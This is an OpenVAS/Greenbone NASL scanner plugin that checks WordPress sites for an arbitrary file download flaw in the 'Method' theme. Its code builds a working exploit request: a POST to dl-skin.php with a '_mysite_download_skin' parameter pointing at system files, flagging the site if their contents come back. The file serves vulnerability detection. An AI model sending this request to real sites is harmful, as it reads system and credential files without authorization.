# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:mysitemyway:method";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105051");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2014-06-26 14:02:57 +0200 (Thu, 26 Jun 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_name("WordPress Theme Method Arbitrary File Download Vulnerability");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_wordpress_theme_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/theme/method/detected");

  script_tag(name:"summary", value:"WordPress theme 'Method' is prone to an arbitrary file download vulnerability");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
 application and the underlying system. Other attacks are also
 possible.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

url = dir + "/lib/scripts/dl-skin.php";

files = traversal_files();

foreach file ( keys( files ) )
{
  ex = "_mysite_download_skin=/" + files[file];
  len = strlen( ex );

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n' +
        'Accept-Encoding: identity\r\n' +
        'Connection: close\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        ex;
  result = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( pattern: file, string:result )  )
  {
    req_resp = 'Request:\n' + req + '\n\nResponse:\n' + substr( result, 0, 800) + '\n[truncated]';
    security_message( port:port, expert_info:req_resp );
    exit( 0 );
  }
}

exit( 99 );
